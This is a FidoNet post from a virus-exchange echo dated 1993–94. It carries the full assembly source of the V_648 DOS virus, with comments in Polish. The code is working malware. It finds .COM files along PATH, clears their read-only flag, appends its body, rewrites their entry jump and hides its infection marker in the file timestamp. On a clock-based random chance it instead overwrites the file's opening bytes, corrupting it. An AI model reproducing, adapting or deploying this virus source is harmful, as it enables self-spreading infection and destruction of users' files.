;ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
; Msg  : 43 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:16
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : V_648.DIS
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;.RealName: Max Ivanov
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
;* From : Clif Jessop, 2:283/718 (06 Nov 94 17:50)
;* To   : Edwin Cleton
;* Subj : V_648.DIS
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Clif.Jessop@f718.n283.z2.fidonet.org
RET_NEAR_POP    MACRO   X
DB  0C2H
DW  X
ENDM

cseg    segment
    assume  cs:cseg
    org $+100h

L0100:  JMP L5BAA

    org 5baah

L5BAA:  PUSH    CX
    MOV DX,OFFSET L5DA3

    CLD             ;odtworzenie zmienionego kawalka
    MOV SI,DX
    ADD SI,0AH
    MOV DI,OFFSET L0100
    MOV CX,3
    REPZ    MOVSB

    MOV SI,DX           ;baza obszaru danych

    MOV AH,30H          ;Get MS-DOS version number
    INT 21H
    CMP AL,0            ;Major version number
    JNZ L5BCA
    JMP L5D91

L5BCA:  PUSH    ES
    MOV AH,2FH          ;Get DTA
    INT 21H
    MOV DS:[SI],BX      ;schowanie starego DTA
    MOV DS:[SI+2],ES
    POP ES

    MOV DX,5FH          ;nowe DTA
    NOP
    ADD DX,SI
    MOV AH,1AH          ;Set DTA
    INT 21H

    PUSH    ES          ;<- szukanie PATH=
    PUSH    SI
    MOV ES,DS:2CH       ;Environment
    MOV DI,0            ;adres w environmencie
L5BEB:  POP SI
    PUSH    SI
    ADD SI,1AH          ;wzorzec PATH=
    LODSB
    MOV CX,8000h
    REPNZ   SCASB
    MOV CX,4
L5BFA:  LODSB
    SCASB
    JNZ L5BEB           ;-> to nie to
    LOOP    L5BFA
    POP SI
    POP ES

    MOV ds:[SI+16H],DI      ;adres zawartosci path'a
    MOV DI,SI
    ADD DI,1FH          ;obszar roboczy
;   PATCH83
    MOV BX,SI
    ADD SI,1FH          ;obszar roboczy
    MOV DI,SI
    JMP SHORT   L5C50

;<------zmiana katalogu
L5C16:  CMP WORD PTR ds:[SI+16H],0  ;adres zawartosci path'a
    JNZ L5C20
    JMP L5D83

L5C20:  PUSH    DS
    PUSH    SI
    MOV DS,ES:2CH       ;segment environmentu
    MOV DI,SI
    MOV SI,ES:[DI+16H]      ;adres zawartosci path'a
    ADD DI,1FH
;   PATCH83
L5C32:  LODSB
    CMP AL,';'          ;czy koniec pozycji ?
    JZ  L5C41
    CMP AL,0            ;koniec environmentu
    JZ  L5C3E           ;-> tak
    STOSB
    JMP SHORT   L5C32

L5C3E:  MOV SI,0            ;znacznik, ze wiecej juz nie ma
L5C41:  POP BX
    POP DS
    MOV ds:[BX+16H],SI      ;schowanie nowego pointera
    CMP BYTE PTR [DI-1],'\' ;czy zakonczone back-slashem
    JZ  L5C50           ;-> tak
    MOV AL,'\'          ;uzupelnienie
    STOSB

L5C50:  MOV ds:[BX+18H],DI      ;adres poczatku nazwy zbioru w path
    MOV SI,BX
    ADD SI,10H          ;'*.com'
    MOV CX,6
    REPZ    MOVSB
    MOV SI,BX
    MOV AH,4EH          ;Find First File
    MOV DX,1FH          ;pointer na pathname
    NOP
    ADD DX,SI
    MOV CX,3            ;Attrributes to match ro+hidden+zwykle
    INT 21H
    JMP SHORT   L5C74

L5C70:  MOV AH,4FH          ;find next
    INT 21H
L5C74:  JNB L5C78           ;-> znaleziono
    JMP SHORT   L5C16       ;-> na nastepny katalog

L5C78:  MOV AX,ds:[SI+75H]      ;Time file was last written
    AND AL,1FH          ;czy juz zawirusowany ?
    CMP AL,1FH
    JZ  L5C70               ;-> tak, odpuszczamy takim
    CMP WORD PTR ds:[SI+79H],0FA00h ;low word of file size
    JA  L5C70               ;-> odpuszczamy zbyt duzym
    CMP WORD PTR ds:[SI+79H],0AH
    JB  L5C70           ;-> odpuszczamy zbyt malym
    MOV DI,ds:[SI+18H]      ;adres nazwy zbioru w path

    PUSH    SI
    ADD SI,7DH          ;nazwa znalezionego zbioru
L5C9A:  LODSB
    STOSB
    CMP AL,0
    JNZ L5C9A
    POP SI

    MOV AX,4300h        ;Get file attributes
    MOV DX,1FH          ;pathname
    NOP
    ADD DX,SI
    INT 21H
    MOV ds:[SI+8],CX        ;Attribute byte

    MOV AX,4301h        ;Set attributes
    AND CX,0FFFEh       ;-read/only
    MOV DX,1FH          ;pathname
    NOP
    ADD DX,SI
    INT 21H

    MOV AX,3D02h        ;Open file/write
    MOV DX,1FH          ;pathname
    NOP
    ADD DX,SI
    INT 21H
    JNB L5CCF
    JMP L5D74

L5CCF:  MOV BX,AX           ;<- open O.K.
    MOV AX,5700h        ;Get date & time of file
    INT 21H
    MOV ds:[SI+4],CX        ;schowanie daty ostatniej modyfikacji
    MOV ds:[SI+6],DX

    MOV AH,2CH          ;Get Time
    INT 21H

    AND DH,7            ;ktory wariant ?
    JNZ L5CF7           ;-> rozmnozenie

                    ;<- destrukcja
    MOV AH,40H          ;Write handle
    MOV CX,5            ;bytes
    MOV DX,SI           ;pointer to buffer
    ADD DX,8AH
    INT 21H
    JMP SHORT   L5D5B

    NOP             ;<- rozmnozenie
L5CF7:  MOV AH,3FH          ;Read handle
    MOV CX,3            ;bytes
    MOV DX,0AH          ;buffer offset
    NOP
    ADD DX,SI
    INT 21H
    JB  L5D5B           ;-> blad
    CMP AX,3            ;bytes read
    JNZ L5D5B           ;zbyt malo

    MOV AX,4202h        ;Move file pointer end+offset
    MOV CX,0            ;offset
    MOV DX,0            ;offset
    INT 21H
    JB  L5D5B           ;-> blad
    MOV CX,AX           ;adres konca
    SUB AX,3            ;minus dlugosc jump'u
    MOV ds:[SI+0EH],AX      ;nowe 3 pierwsze bajty
    ADD CX,02F9h
    MOV DI,SI
    SUB DI,01F7h
    MOV [DI],CX         ;<- adres zmiennych
    MOV AH,40H          ;write handle
    MOV CX,0288h        ;dlugosc wirusa
    MOV DX,SI           ;poczatek wirusa
    SUB DX,01F9h
    INT 21H
    JB  L5D5B           ;-> blad

    CMP AX,0288h        ;czy wszystko zapisano
    JNZ L5D5B           ;-> nie
    MOV AX,4200         ;Move file pointer poczatek
    MOV CX,0            ;offset
    MOV DX,0            ;offset
    INT 21H
    JB  L5D5B           ;-> blad

    MOV AH,40H          ;write
    MOV CX,3            ;dlugosc
    MOV DX,SI           ;buffer
    ADD DX,0DH
    INT 21H
L5D5B:  MOV DX,ds:[SI+6]        ;koniec obrobki zbioru
    MOV CX,ds:[SI+4]
    AND CX,0FFE0h       ;znacznik zawirusowania - czas
    OR  CX,1FH
    MOV AX,5701h        ;Set Date/Time of File
    INT 21H
    MOV AH,3EH          ;Close handle
    INT 21H
                    ;<- blad otwarcia zbioru
L5D74:  MOV AX,4301h        ;Set File attributes
    MOV CX,ds:[SI+8]
    MOV DX,1FH
    NOP
    ADD DX,SI
    INT 21H

L5D83:  PUSH    DS
    MOV AH,1AH          ;Set DTA
    MOV DX,ds:[SI+0]        ;poprzednia wartosc
    MOV DS,ds:[SI+2]        ;poprzednia wartosc
    INT 21H
    POP DS

L5D91:  POP CX          ;<- gdy dos < 2.0
    XOR AX,AX
    XOR BX,BX
    XOR DX,DX
    XOR SI,SI
    MOV DI,0100h        ;adres restartu
    PUSH    DI
    XOR DI,DI
    RET_NEAR_POP    0FFFFH

L5DA3   label   word            ;<- poczatek zmiennych programu
x0000   equ $-l5da3
    dw  0080h,440Ch     ;adres DTA oryginalny
x0004   equ $-l5da3
    Dw  6d60H           ;Time file last written
x0006   equ $-l5da3
    Dw  0a67H           ;Date file last written
x0008   dw  0020h           ;file attribute - oryginal
x000a   equ $-l5da3
    db  0E9h,0ADh,0Bh       ;schowana poprzednia zawartosc [100h]
x000d   equ $-l5da3
    db  0E9h,0A7h,5ah       ;zapisywane do zbioru
x0010   equ $-l5da3
    DB  '*.COM',0       ;wzorzec do szukania
x0016   equ $-l5da3
    dw  001CH           ;adres path= w environmencie
x0018b  equ $-l5da3
    dw  65F3H           ;adres nazwy zbioru w path x001f
x001a   equ $-l5da3
    db  'PATH='         ;szukane w environmencie
;---------------------------------------
x001f   equ $-l5da3
    db  'COMMAND.COM',0     ;nazwa obrabianego zbioru
    db  'OM',0
    db  'M',0
    db  'COM',0
    db  'OM',0
    db  '                    '
    db  '                    '

;----------------------------------------
x005f   equ $-l5da3         ;<- nowe DTA
    db  1,'????????COM',3,2 ;reserved area
    db  ?,?
    DB  0,0,0,0,0,0,0
    db  20h         ;attribute found
x0075   equ $-l5da3
    dw  6d60h           ;Time file was last written
    dw  0a67h           ;date file was last written
x0079   equ $-l5da3
    Dw  5AAAH           ;Low word of file size
    Dw  0           ;High word of file size
x007d   equ $-l5da3
    db  'COMMAND.COM',0,0   ;name and extension
;----------------------------------------

x008a   equ $-l5da3         ;zapisywane do zbioru
    db  0EAH,0F0H,0FFH,0,0F0H   ;jmp    0f000:0fff0h

cseg    ENDS

    END L0100

;-+-  DinoMail v.1.0 Alpha
; + Origin: Hans' Point with DOSBoss West, Amsterdam (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeยeO
;
;/Txx          Specify output file type
;
;--- Aidstest Null: /Kill
; * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)

